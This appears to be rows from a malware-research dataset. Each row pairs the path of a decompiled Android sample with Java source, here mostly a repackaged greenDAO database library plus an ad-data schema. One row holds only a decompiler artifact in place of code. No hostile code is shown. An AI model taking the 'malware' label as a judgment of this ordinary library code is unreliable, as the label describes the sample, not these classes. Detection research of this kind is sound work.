"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.de.greenrobot.dao\InternalUnitTestDaoAccess.code","public class InternalUnitTestDaoAccess<T,K> {   private final AbstractDao<T,K> dao;   public InternalUnitTestDaoAccess(  SQLiteDatabase sQLiteDatabase,  Class<AbstractDao<T,K>> cls,  IdentityScope<?,?> identityScope){     DaoConfig daoConfig=new DaoConfig(sQLiteDatabase,cls);     daoConfig.setIdentityScope(identityScope);     this.dao=cls.getConstructor(DaoConfig.class).newInstance(daoConfig);   }   public AbstractDao<T,K> getDao(){     return this.dao;   }   public K getKey(  T t){     return this.dao.getKey(t);   }   public Property[] getProperties(){     return this.dao.getProperties();   }   public boolean isEntityUpdateable(){     return this.dao.isEntityUpdateable();   }   public T readEntity(  Cursor cursor,  int i){     return this.dao.readEntity(cursor,i);   }   public K readKey(  Cursor cursor,  int i){     return this.dao.readKey(cursor,i);   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.de.greenrobot.dao\Properties.code","public class Properties {   public static final Property Id=new Property(0,Long.class,""id"",true,""_id"");   public static final Property Expires=new Property(1,Long.class,""expires"",false,""EXPIRES"");   public static final Property AdId=new Property(2,Integer.class,""adId"",false,""AD_ID"");   public static final Property Kind=new Property(3,Integer.class,""kind"",false,""KIND"");   public static final Property Url=new Property(4,String.class,""url"",false,""URL"");   public static final Property Recommend=new Property(5,String.class,""recommend"",false,""RECOMMEND"");   public static final Property PackageName=new Property(6,String.class,""packageName"",false,""PACKAGE_NAME"");   public static final Property AppName=new Property(7,String.class,""appName"",false,""APP_NAME"");   public static final Property Intro=new Property(8,String.class,""intro"",false,""INTRO"");   public static final Property AppSize=new Property(9,String.class,""appSize"",false,""APP_SIZE"");   public static final Property AppVersion=new Property(10,String.class,""appVersion"",false,""APP_VERSION"");   public static final Property Icon=new Property(11,String.class,""icon"",false,""ICON"");   public static final Property Printscreen=new Property(12,String.class,""printscreen"",false,""PRINTSCREEN"");   public static final Property G2Switches=new Property(13,String.class,""g2Switches"",false,""G2_SWITCHES"");   public static final Property G3Switches=new Property(14,String.class,""g3Switches"",false,""G3_SWITCHES"");   public static final Property WifiSwitches=new Property(15,String.class,""wifiSwitches"",false,""WIFI_SWITCHES"");   public static final Property ShowPeriod=new Property(16,String.class,""showPeriod"",false,""SHOW_PERIOD"");   public static final Property DiyImg=new Property(17,String.class,""diyImg"",false,""DIY_IMG""); } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.de.greenrobot.dao\Property.code","public class Property {   public final String columnName;   public final String name;   public final int ordinal;   public final boolean primaryKey;   public final Class<?> type;   public Property(  int i,  Class<?> cls,  String str,  boolean z,  String str2){     this.ordinal=i;     this.type=cls;     this.name=str;     this.primaryKey=z;     this.columnName=str2;   }   public WhereCondition between(  Object obj,  Object obj2){     return new WhereCondition.PropertyCondition(this,"" BETWEEN ? AND ?"",new Object[]{obj,obj2});   }   public WhereCondition eq(  Object obj){     return new WhereCondition.PropertyCondition(this,""=?"",obj);   }   public WhereCondition ge(  Object obj){     return new WhereCondition.PropertyCondition(this,"">=?"",obj);   }   public WhereCondition gt(  Object obj){     return new WhereCondition.PropertyCondition(this,"">?"",obj);   }   public WhereCondition in(  Collection<?> collection){     return in(collection.toArray());   }   public WhereCondition in(  Object... objArr){     StringBuilder sb=new StringBuilder("" IN ("");     SqlUtils.appendPlaceholders(sb,objArr.length).append(')');     return new WhereCondition.PropertyCondition(this,sb.toString(),objArr);   }   public WhereCondition isNotNull(){     return new WhereCondition.PropertyCondition(this,"" IS NOT NULL"");   }   public WhereCondition isNull(){     return new WhereCondition.PropertyCondition(this,"" IS NULL"");   }   public WhereCondition le(  Object obj){     return new WhereCondition.PropertyCondition(this,""<=?"",obj);   }   public WhereCondition like(  String str){     return new WhereCondition.PropertyCondition(this,"" LIKE ?"",str);   }   public WhereCondition lt(  Object obj){     return new WhereCondition.PropertyCondition(this,""<?"",obj);   }   public WhereCondition notEq(  Object obj){     return new WhereCondition.PropertyCondition(this,""<>?"",obj);   }   public WhereCondition notIn(  Collection<?> collection){     return notIn(collection.toArray());   }   public WhereCondition notIn(  Object... objArr){     StringBuilder sb=new StringBuilder("" NOT IN ("");     SqlUtils.appendPlaceholders(sb,objArr.length).append(')');     return new WhereCondition.PropertyCondition(this,sb.toString(),objArr);   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.de.greenrobot.dao.async\AsyncDaoException.code","public class AsyncDaoException extends DaoException {   private static final long serialVersionUID=5872157552005102382L;   private final AsyncOperation failedOperation;   public AsyncDaoException(  AsyncOperation asyncOperation,  Throwable th){     super(th);     this.failedOperation=asyncOperation;   }   public AsyncOperation getFailedOperation(){     return this.failedOperation;   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.de.greenrobot.dao.async\AsyncOperation.code","public class AsyncOperation {   public static final int FLAG_MERGE_TX=1;   public static final int FLAG_STOP_QUEUE_ON_EXCEPTION=2;   private volatile boolean completed;   final AbstractDao<Object,Object> dao;   private final SQLiteDatabase database;   final int flags;   volatile int mergedOperationsCount;   final Object parameter;   volatile Object result;   int sequenceNumber;   volatile Throwable throwable;   volatile long timeCompleted;   volatile long timeStarted;   final OperationType type;   public enum OperationType {  Insert,   InsertInTxIterable,   InsertInTxArray,   InsertOrReplace,   InsertOrReplaceInTxIterable,   InsertOrReplaceInTxArray,   Update,   UpdateInTxIterable,   UpdateInTxArray,   Delete,   DeleteInTxIterable,   DeleteInTxArray,   DeleteByKey,   DeleteAll,   TransactionRunnable,   TransactionCallable,   QueryList,   QueryUnique,   Load,   LoadAll,   Count,   Refresh}   public AsyncOperation(  OperationType operationType,  SQLiteDatabase sQLiteDatabase,  Object obj,  int i){     this.type=operationType;     this.database=sQLiteDatabase;     this.flags=i;     this.dao=null;     this.parameter=obj;   }   public AsyncOperation(  OperationType operationType,  AbstractDao<?,?> abstractDao,  Object obj,  int i){     this.type=operationType;     this.flags=i;     this.dao=abstractDao;     this.database=null;     this.parameter=obj;   }   public SQLiteDatabase getDatabase(){     return this.database != null ? this.database : this.dao.getDatabase();   }   public long getDuration(){     if (this.timeCompleted == 0) {       throw new DaoException(""This operation did not yet complete"");     }     return this.timeCompleted - this.timeStarted;   }   public int getMergedOperationsCount(){     return this.mergedOperationsCount;   }   public Object getParameter(){     return this.parameter;   }   public synchronized Object getResult(){     if (!this.completed) {       waitForCompletion();     }     if (this.throwable != null) {       throw new AsyncDaoException(this,this.throwable);     }     return this.result;   }   public int getSequenceNumber(){     return this.sequenceNumber;   }   public Throwable getThrowable(){     return this.throwable;   }   public long getTimeCompleted(){     return this.timeCompleted;   }   public long getTimeStarted(){     return this.timeStarted;   }   public OperationType getType(){     return this.type;   }   public boolean isCompleted(){     return this.completed;   }   public boolean isCompletedSucessfully(){     return this.completed && this.throwable == null;   }   public boolean isFailed(){     return this.throwable != null;   }   public boolean isMergeTx(){     return (this.flags & 1) != 0;   }   public boolean isMergeableWith(  AsyncOperation asyncOperation){     return asyncOperation != null && isMergeTx() && asyncOperation.isMergeTx() && getDatabase() == asyncOperation.getDatabase();   }   public void reset(){     this.timeStarted=0L;     this.timeCompleted=0L;     this.completed=false;     this.throwable=null;     this.result=null;     this.mergedOperationsCount=0;   }   public synchronized void setCompleted(){     this.completed=true;     notifyAll();   }   public void setThrowable(  Throwable th){     this.throwable=th;   }   public synchronized Object waitForCompletion(){     while (!this.completed) {       try {         wait();       }  catch (      InterruptedException e) {         throw new DaoException(""Interrupted while waiting for operation to complete"",e);       }     }     return this.result;   }   public synchronized boolean waitForCompletion(  int i){     if (!this.completed) {       try {         wait(i);       }  catch (      InterruptedException e) {         throw new DaoException(""Interrupted while waiting for operation to complete"",e);       }     }     return this.completed;   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.de.greenrobot.dao.async\AsyncOperationExecutor.code","!org.eclipse.jdt.core.dom.TypeDeclaration@7f3638c3"
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.de.greenrobot.dao.async\AsyncOperationListener.code","public interface AsyncOperationListener {   void onAsyncOperationCompleted(  AsyncOperation asyncOperation); } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.de.greenrobot.dao.async\AsyncSession.code","public class AsyncSession {   private final AbstractDaoSession daoSession;   private final AsyncOperationExecutor executor=new AsyncOperationExecutor();   public AsyncSession(  AbstractDaoSession abstractDaoSession){     this.daoSession=abstractDaoSession;   }   private <E>AsyncOperation enqueEntityOperation(  AsyncOperation.OperationType operationType,  Class<E> cls,  Object obj,  int i){     AsyncOperation asyncOperation=new AsyncOperation(operationType,this.daoSession.getDao(cls),obj,i);     this.executor.enqueue(asyncOperation);     return asyncOperation;   }   private AsyncOperation enqueueDatabaseOperation(  AsyncOperation.OperationType operationType,  Object obj,  int i){     AsyncOperation asyncOperation=new AsyncOperation(operationType,this.daoSession.getDatabase(),obj,i);     this.executor.enqueue(asyncOperation);     return asyncOperation;   }   private AsyncOperation enqueueEntityOperation(  AsyncOperation.OperationType operationType,  Object obj,  int i){     return enqueEntityOperation(operationType,obj.getClass(),obj,i);   }   public AsyncOperation callInTx(  Callable<?> callable){     return callInTx(callable,0);   }   public AsyncOperation callInTx(  Callable<?> callable,  int i){     return enqueueDatabaseOperation(AsyncOperation.OperationType.TransactionCallable,callable,i);   }   public AsyncOperation count(  Class<?> cls){     return count(cls,0);   }   public AsyncOperation count(  Class<?> cls,  int i){     return enqueEntityOperation(AsyncOperation.OperationType.Count,cls,null,i);   }   public AsyncOperation delete(  Object obj){     return delete(obj,0);   }   public AsyncOperation delete(  Object obj,  int i){     return enqueueEntityOperation(AsyncOperation.OperationType.Delete,obj,i);   }   public <E>AsyncOperation deleteAll(  Class<E> cls){     return deleteAll(cls,0);   }   public <E>AsyncOperation deleteAll(  Class<E> cls,  int i){     return enqueEntityOperation(AsyncOperation.OperationType.DeleteAll,cls,null,i);   }   public AsyncOperation deleteByKey(  Object obj){     return deleteByKey(obj,0);   }   public AsyncOperation deleteByKey(  Object obj,  int i){     return enqueueEntityOperation(AsyncOperation.OperationType.DeleteByKey,obj,i);   }   public <E>AsyncOperation deleteInTx(  Class<E> cls,  int i,  E... eArr){     return enqueEntityOperation(AsyncOperation.OperationType.DeleteInTxArray,cls,eArr,i);   }   public <E>AsyncOperation deleteInTx(  Class<E> cls,  Iterable<E> iterable){     return deleteInTx(cls,iterable,0);   }   public <E>AsyncOperation deleteInTx(  Class<E> cls,  Iterable<E> iterable,  int i){     return enqueEntityOperation(AsyncOperation.OperationType.DeleteInTxIterable,cls,iterable,i);   }   public <E>AsyncOperation deleteInTx(  Class<E> cls,  E... eArr){     return deleteInTx(cls,0,eArr);   }   public AsyncOperationListener getListener(){     return this.executor.getListener();   }   public AsyncOperationListener getListenerMainThread(){     return this.executor.getListenerMainThread();   }   public int getMaxOperationCountToMerge(){     return this.executor.getMaxOperationCountToMerge();   }   public int getWaitForMergeMillis(){     return this.executor.getWaitForMergeMillis();   }   public AsyncOperation insert(  Object obj){     return insert(obj,0);   }   public AsyncOperation insert(  Object obj,  int i){     return enqueueEntityOperation(AsyncOperation.OperationType.Insert,obj,i);   }   public <E>AsyncOperation insertInTx(  Class<E> cls,  int i,  E... eArr){     return enqueEntityOperation(AsyncOperation.OperationType.InsertInTxArray,cls,eArr,i);   }   public <E>AsyncOperation insertInTx(  Class<E> cls,  Iterable<E> iterable){     return insertInTx(cls,iterable,0);   }   public <E>AsyncOperation insertInTx(  Class<E> cls,  Iterable<E> iterable,  int i){     return enqueEntityOperation(AsyncOperation.OperationType.InsertInTxIterable,cls,iterable,i);   }   public <E>AsyncOperation insertInTx(  Class<E> cls,  E... eArr){     return insertInTx(cls,0,eArr);   }   public AsyncOperation insertOrReplace(  Object obj){     return insertOrReplace(obj,0);   }   public AsyncOperation insertOrReplace(  Object obj,  int i){     return enqueueEntityOperation(AsyncOperation.OperationType.InsertOrReplace,obj,i);   }   public <E>AsyncOperation insertOrReplaceInTx(  Class<E> cls,  int i,  E... eArr){     return enqueEntityOperation(AsyncOperation.OperationType.InsertOrReplaceInTxArray,cls,eArr,i);   }   public <E>AsyncOperation insertOrReplaceInTx(  Class<E> cls,  Iterable<E> iterable){     return insertOrReplaceInTx(cls,iterable,0);   }   public <E>AsyncOperation insertOrReplaceInTx(  Class<E> cls,  Iterable<E> iterable,  int i){     return enqueEntityOperation(AsyncOperation.OperationType.InsertOrReplaceInTxIterable,cls,iterable,i);   }   public <E>AsyncOperation insertOrReplaceInTx(  Class<E> cls,  E... eArr){     return insertOrReplaceInTx(cls,0,eArr);   }   public boolean isCompleted(){     return this.executor.isCompleted();   }   public AsyncOperation load(  Class<?> cls,  Object obj){     return load(cls,obj,0);   }   public AsyncOperation load(  Class<?> cls,  Object obj,  int i){     return enqueEntityOperation(AsyncOperation.OperationType.Load,cls,obj,i);   }   public AsyncOperation loadAll(  Class<?> cls){     return loadAll(cls,0);   }   public AsyncOperation loadAll(  Class<?> cls,  int i){     return enqueEntityOperation(AsyncOperation.OperationType.LoadAll,cls,null,i);   }   public AsyncOperation queryList(  Query<?> query){     return queryList(query,0);   }   public AsyncOperation queryList(  Query<?> query,  int i){     return enqueueDatabaseOperation(AsyncOperation.OperationType.QueryList,query,i);   }   public AsyncOperation queryUnique(  Query<?> query){     return queryUnique(query,0);   }   public AsyncOperation queryUnique(  Query<?> query,  int i){     return enqueueDatabaseOperation(AsyncOperation.OperationType.QueryUnique,query,i);   }   public AsyncOperation refresh(  Object obj){     return refresh(obj,0);   }   public AsyncOperation refresh(  Object obj,  int i){     return enqueueEntityOperation(AsyncOperation.OperationType.Refresh,obj,i);   }   public AsyncOperation runInTx(  Runnable runnable){     return runInTx(runnable,0);   }   public AsyncOperation runInTx(  Runnable runnable,  int i){     return enqueueDatabaseOperation(AsyncOperation.OperationType.TransactionRunnable,runnable,i);   }   public void setListener(  AsyncOperationListener asyncOperationListener){     this.executor.setListener(asyncOperationListener);   }   public void setListenerMainThread(  AsyncOperationListener asyncOperationListener){     this.executor.setListenerMainThread(asyncOperationListener);   }   public void setMaxOperationCountToMerge(  int i){     this.executor.setMaxOperationCountToMerge(i);   }   public void setWaitForMergeMillis(  int i){     this.executor.setWaitForMergeMillis(i);   }   public AsyncOperation update(  Object obj){     return update(obj,0);   }   public AsyncOperation update(  Object obj,  int i){     return enqueueEntityOperation(AsyncOperation.OperationType.Update,obj,i);   }   public <E>AsyncOperation updateInTx(  Class<E> cls,  int i,  E... eArr){     return enqueEntityOperation(AsyncOperation.OperationType.UpdateInTxArray,cls,eArr,i);   }   public <E>AsyncOperation updateInTx(  Class<E> cls,  Iterable<E> iterable){     return updateInTx(cls,iterable,0);   }   public <E>AsyncOperation updateInTx(  Class<E> cls,  Iterable<E> iterable,  int i){     return enqueEntityOperation(AsyncOperation.OperationType.UpdateInTxIterable,cls,iterable,i);   }   public <E>AsyncOperation updateInTx(  Class<E> cls,  E... eArr){     return updateInTx(cls,0,eArr);   }   public void waitForCompletion(){     this.executor.waitForCompletion();   }   public boolean waitForCompletion(  int i){     return this.executor.waitForCompletion(i);   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.de.greenrobot.dao.identityscope\IdentityScope.code","public interface IdentityScope<K,T> {   void clear();   boolean detach(  K k,  T t);   T get(  K k);   T getNoLock(  K k);   void lock();   void put(  K k,  T t);   void putNoLock(  K k,  T t);   void remove(  Iterable<K> iterable);   void remove(  K k);   void reserveRoom(  int i);   void unlock(); } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.de.greenrobot.dao.identityscope\IdentityScopeLong.code","public class IdentityScopeLong<T> implements IdentityScope<Long,T> {   private final LongHashMap<Reference<T>> map=new LongHashMap<>();   private final ReentrantLock lock=new ReentrantLock();   @Override public void clear(){     this.lock.lock();     try {       this.map.clear();     }   finally {       this.lock.unlock();     }   }   public boolean detach2(  Long l,  T t){     ReentrantLock reentrantLock;     this.lock.lock();     try {       if (get(l) != t || t == null) {         return false;       }       remove(l);       return true;     }   finally {       this.lock.unlock();     }   }   @Override public boolean detach(  Long l,  Object obj){     return detach2(l,(Long)obj);   }   @Override public T get(  Long l){     return get2(l.longValue());   }   public T get2(  long j){     this.lock.lock();     try {       Reference<T> reference=this.map.get(j);       if (reference != null) {         return reference.get();       }       return null;     }   finally {       this.lock.unlock();     }   }   public T get2NoLock(  long j){     Reference<T> reference=this.map.get(j);     if (reference != null) {       return reference.get();     }     return null;   }   @Override public T getNoLock(  Long l){     return get2NoLock(l.longValue());   }   @Override public void lock(){     this.lock.lock();   }   public void put3(  Long l,  T t){     put2(l.longValue(),t);   }   @Override public void put(  Long l,  Object obj){     put3(l,(Long)obj);   }   public void put2(  long j,  T t){     this.lock.lock();     try {       this.map.put(j,new WeakReference(t));     }   finally {       this.lock.unlock();     }   }   public void put2NoLock(  long j,  T t){     this.map.put(j,new WeakReference(t));   }   public void putNoLock2(  Long l,  T t){     put2NoLock(l.longValue(),t);   }   @Override public void putNoLock(  Long l,  Object obj){     putNoLock2(l,(Long)obj);   }   @Override public void remove(  Iterable<Long> iterable){     this.lock.lock();     try {       Iterator<Long> it=iterable.iterator();       while (it.hasNext()) {         this.map.remove(it.next().longValue());       }     }   finally {       this.lock.unlock();     }   }   @Override public void remove(  Long l){     this.lock.lock();     try {       this.map.remove(l.longValue());     }   finally {       this.lock.unlock();     }   }   @Override public void reserveRoom(  int i){     this.map.reserveRoom(i);   }   @Override public void unlock(){     this.lock.unlock();   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.de.greenrobot.dao.identityscope\IdentityScopeObject.code","public class IdentityScopeObject<K,T> implements IdentityScope<K,T> {   private final HashMap<K,Reference<T>> map=new HashMap<>();   private final ReentrantLock lock=new ReentrantLock();   @Override public void clear(){     this.lock.lock();     try {       this.map.clear();     }   finally {       this.lock.unlock();     }   }   @Override public boolean detach(  K k,  T t){     ReentrantLock reentrantLock;     this.lock.lock();     try {       if (get(k) != t || t == null) {         return false;       }       remove((IdentityScopeObject<K,T>)k);       return true;     }   finally {       this.lock.unlock();     }   }   @Override public T get(  K k){     this.lock.lock();     try {       Reference<T> reference=this.map.get(k);       if (reference != null) {         return reference.get();       }       return null;     }   finally {       this.lock.unlock();     }   }   @Override public T getNoLock(  K k){     Reference<T> reference=this.map.get(k);     if (reference != null) {       return reference.get();     }     return null;   }   @Override public void lock(){     this.lock.lock();   }   @Override public void put(  K k,  T t){     this.lock.lock();     try {       this.map.put(k,new WeakReference(t));     }   finally {       this.lock.unlock();     }   }   @Override public void putNoLock(  K k,  T t){     this.map.put(k,new WeakReference(t));   }   @Override public void remove(  Iterable<K> iterable){     this.lock.lock();     try {       Iterator<K> it=iterable.iterator();       while (it.hasNext()) {         this.map.remove(it.next());       }     }   finally {       this.lock.unlock();     }   }   @Override public void remove(  K k){     this.lock.lock();     try {       this.map.remove(k);     }   finally {       this.lock.unlock();     }   }   @Override public void reserveRoom(  int i){   }   @Override public void unlock(){     this.lock.unlock();   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.de.greenrobot.dao.internal\DaoConfig.code","public final class DaoConfig implements Cloneable {   public final String[] allColumns;   public final SQLiteDatabase db;   private IdentityScope<?,?> identityScope;   public final boolean keyIsNumeric;   public final String[] nonPkColumns;   public final String[] pkColumns;   public final Property pkProperty;   public final Property[] properties;   public final TableStatements statements;   public final String tablename;   public DaoConfig(  SQLiteDatabase sQLiteDatabase,  Class<? extends AbstractDao<?,?>> cls){     this.db=sQLiteDatabase;     try {       this.tablename=(String)cls.getField(""TABLENAME"").get(null);       Property[] reflectProperties=reflectProperties(cls);       this.properties=reflectProperties;       this.allColumns=new String[reflectProperties.length];       ArrayList arrayList=new ArrayList();       ArrayList arrayList2=new ArrayList();       int i=0;       Property property=null;       while (i < reflectProperties.length) {         Property property2=reflectProperties[i];         String str=property2.columnName;         this.allColumns[i]=str;         if (property2.primaryKey) {           arrayList.add(str);         }  else {           arrayList2.add(str);           property2=property;         }         i++;         property=property2;       }       this.nonPkColumns=(String[])arrayList2.toArray(new String[arrayList2.size()]);       this.pkColumns=(String[])arrayList.toArray(new String[arrayList.size()]);       this.pkProperty=this.pkColumns.length != 1 ? null : property;       this.statements=new TableStatements(sQLiteDatabase,this.tablename,this.allColumns,this.pkColumns);       if (this.pkProperty == null) {         this.keyIsNumeric=false;       }  else {         Class<?> cls2=this.pkProperty.type;         this.keyIsNumeric=cls2.equals(Long.TYPE) || cls2.equals(Long.class) || cls2.equals(Integer.TYPE)|| cls2.equals(Integer.class)|| cls2.equals(Short.TYPE)|| cls2.equals(Short.class)|| cls2.equals(Byte.TYPE)|| cls2.equals(Byte.class);       }     }  catch (    Exception e) {       throw new DaoException(""Could not init DAOConfig"",e);     }   }   public DaoConfig(  DaoConfig daoConfig){     this.db=daoConfig.db;     this.tablename=daoConfig.tablename;     this.properties=daoConfig.properties;     this.allColumns=daoConfig.allColumns;     this.pkColumns=daoConfig.pkColumns;     this.nonPkColumns=daoConfig.nonPkColumns;     this.pkProperty=daoConfig.pkProperty;     this.statements=daoConfig.statements;     this.keyIsNumeric=daoConfig.keyIsNumeric;   }   private static Property[] reflectProperties(  Class<? extends AbstractDao<?,?>> cls){     Field[] declaredFields=Class.forName(cls.getName() + ""$Properties"").getDeclaredFields();     ArrayList arrayList=new ArrayList();     for (    Field field : declaredFields) {       if ((field.getModifiers() & 9) == 9) {         Object obj=field.get(null);         if (obj instanceof Property) {           arrayList.add((Property)obj);         }       }     }     Property[] propertyArr=new Property[arrayList.size()];     Iterator it=arrayList.iterator();     while (it.hasNext()) {       Property property=(Property)it.next();       if (propertyArr[property.ordinal] != null) {         throw new DaoException(""Duplicate property ordinals"");       }       propertyArr[property.ordinal]=property;     }     return propertyArr;   }   public DaoConfig m2clone(){     return new DaoConfig(this);   }   public IdentityScope<?,?> getIdentityScope(){     return this.identityScope;   }   public void initIdentityScope(  IdentityScopeType identityScopeType){     if (identityScopeType == IdentityScopeType.None) {       this.identityScope=null;     }  else {       if (identityScopeType != IdentityScopeType.Session) {         throw new IllegalArgumentException(""Unsupported type: "" + identityScopeType);       }       if (this.keyIsNumeric) {         this.identityScope=new IdentityScopeLong();       }  else {         this.identityScope=new IdentityScopeObject();       }     }   }   public void setIdentityScope(  IdentityScope<?,?> identityScope){     this.identityScope=identityScope;   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.de.greenrobot.dao.internal\Entry.code","public final class Entry<T> {   final long key;   Entry<T> next;   T value;   Entry(  long j,  T t,  Entry<T> entry){     this.key=j;     this.value=t;     this.next=entry;   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.de.greenrobot.dao.internal\FastCursor.code","public final class FastCursor implements Cursor {   private final int count;   private int position;   private final CursorWindow window;   public FastCursor(  CursorWindow cursorWindow){     this.window=cursorWindow;     this.count=cursorWindow.getNumRows();   }   @Override public void close(){     throw new UnsupportedOperationException();   }   @Override public void copyStringToBuffer(  int i,  CharArrayBuffer charArrayBuffer){     throw new UnsupportedOperationException();   }   @Override public void deactivate(){     throw new UnsupportedOperationException();   }   @Override public byte[] getBlob(  int i){     return this.window.getBlob(this.position,i);   }   @Override public int getColumnCount(){     throw new UnsupportedOperationException();   }   @Override public int getColumnIndex(  String str){     throw new UnsupportedOperationException();   }   @Override public int getColumnIndexOrThrow(  String str){     throw new UnsupportedOperationException();   }   @Override public String getColumnName(  int i){     throw new UnsupportedOperationException();   }   @Override public String[] getColumnNames(){     throw new UnsupportedOperationException();   }   @Override public int getCount(){     return this.window.getNumRows();   }   @Override public double getDouble(  int i){     return this.window.getDouble(this.position,i);   }   @Override public Bundle getExtras(){     throw new UnsupportedOperationException();   }   @Override public float getFloat(  int i){     return this.window.getFloat(this.position,i);   }   @Override public int getInt(  int i){     return this.window.getInt(this.position,i);   }   @Override public long getLong(  int i){     return this.window.getLong(this.position,i);   }   @Override public Uri getNotificationUri(){     return null;   }   @Override public int getPosition(){     return this.position;   }   @Override public short getShort(  int i){     return this.window.getShort(this.position,i);   }   @Override public String getString(  int i){     return this.window.getString(this.position,i);   }   @Override public int getType(  int i){     throw new UnsupportedOperationException();   }   @Override public boolean getWantsAllOnMoveCalls(){     throw new UnsupportedOperationException();   }   @Override public boolean isAfterLast(){     throw new UnsupportedOperationException();   }   @Override public boolean isBeforeFirst(){     throw new UnsupportedOperationException();   }   @Override public boolean isClosed(){     throw new UnsupportedOperationException();   }   @Override public boolean isFirst(){     return this.position == 0;   }   @Override public boolean isLast(){     return this.position == this.count + (-1);   }   @Override public boolean isNull(  int i){     return this.window.isNull(this.position,i);   }   @Override public boolean move(  int i){     return moveToPosition(this.position + i);   }   @Override public boolean moveToFirst(){     this.position=0;     return this.count > 0;   }   @Override public boolean moveToLast(){     if (this.count <= 0) {       return false;     }     this.position=this.count - 1;     return true;   }   @Override public boolean moveToNext(){     if (this.position >= this.count - 1) {       return false;     }     this.position++;     return true;   }   @Override public boolean moveToPosition(  int i){     if (i < 0 || i >= this.count) {       return false;     }     this.position=i;     return true;   }   @Override public boolean moveToPrevious(){     if (this.position <= 0) {       return false;     }     this.position--;     return true;   }   @Override public void registerContentObserver(  ContentObserver contentObserver){     throw new UnsupportedOperationException();   }   @Override public void registerDataSetObserver(  DataSetObserver dataSetObserver){     throw new UnsupportedOperationException();   }   @Override public boolean requery(){     throw new UnsupportedOperationException();   }   @Override public Bundle respond(  Bundle bundle){     throw new UnsupportedOperationException();   }   @Override public void setNotificationUri(  ContentResolver contentResolver,  Uri uri){     throw new UnsupportedOperationException();   }   @Override public void unregisterContentObserver(  ContentObserver contentObserver){     throw new UnsupportedOperationException();   }   @Override public void unregisterDataSetObserver(  DataSetObserver dataSetObserver){     throw new UnsupportedOperationException();   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.de.greenrobot.dao.internal\LongHashMap.code","public final class LongHashMap<T> {   private int capacity;   private int size;   private Entry<T>[] table;   private int threshold; public final class Entry<T> {     final long key;     Entry<T> next;     T value;     Entry(    long j,    T t,    Entry<T> entry){       this.key=j;       this.value=t;       this.next=entry;     }   }   public LongHashMap(){     this(16);   }   public LongHashMap(  int i){     this.capacity=i;     this.threshold=(i * 4) / 3;     this.table=new Entry[i];   }   public void clear(){     this.size=0;     Arrays.fill(this.table,(Object)null);   }   public boolean containsKey(  long j){     for (Entry<T> entry=this.table[((((int)(j >>> 32)) ^ ((int)j)) & Integer.MAX_VALUE) % this.capacity]; entry != null; entry=entry.next) {       if (entry.key == j) {         return true;       }     }     return false;   }   public T get(  long j){     for (Entry<T> entry=this.table[((((int)(j >>> 32)) ^ ((int)j)) & Integer.MAX_VALUE) % this.capacity]; entry != null; entry=entry.next) {       if (entry.key == j) {         return entry.value;       }     }     return null;   }   public void logStats(){     int i=0;     for (    Entry<T> entry : this.table) {       for (; entry != null && entry.next != null; entry=entry.next) {         i++;       }     }     DaoLog.d(""load: "" + (this.size / this.capacity) + "", size: ""+ this.size+ "", capa: ""+ this.capacity+ "", collisions: ""+ i+ "", collision ratio: ""+ (i / this.size));   }   public T put(  long j,  T t){     int i=((((int)(j >>> 32)) ^ ((int)j)) & Integer.MAX_VALUE) % this.capacity;     Entry<T> entry=this.table[i];     for (Entry<T> entry2=entry; entry2 != null; entry2=entry2.next) {       if (entry2.key == j) {         T t2=entry2.value;         entry2.value=t;         return t2;       }     }     this.table[i]=new Entry<>(j,t,entry);     this.size++;     if (this.size > this.threshold) {       setCapacity(this.capacity * 2);     }     return null;   }   public T remove(  long j){     int i=((((int)(j >>> 32)) ^ ((int)j)) & Integer.MAX_VALUE) % this.capacity;     Entry<T> entry=this.table[i];     Entry<T> entry2=null;     while (entry != null) {       Entry<T> entry3=entry.next;       if (entry.key == j) {         if (entry2 == null) {           this.table[i]=entry3;         }  else {           entry2.next=entry3;         }         this.size--;         return entry.value;       }       entry2=entry;       entry=entry3;     }     return null;   }   public void reserveRoom(  int i){     setCapacity((i * 5) / 3);   }   public void setCapacity(  int i){     Entry<T>[] entryArr=new Entry[i];     int length=this.table.length;     for (int i2=0; i2 < length; i2++) {       Entry<T> entry=this.table[i2];       while (entry != null) {         long j=entry.key;         int i3=((((int)(j >>> 32)) ^ ((int)j)) & Integer.MAX_VALUE) % i;         Entry<T> entry2=entry.next;         entry.next=entryArr[i3];         entryArr[i3]=entry;         entry=entry2;       }     }     this.table=entryArr;     this.capacity=i;     this.threshold=(i * 4) / 3;   }   public int size(){     return this.size;   } } "
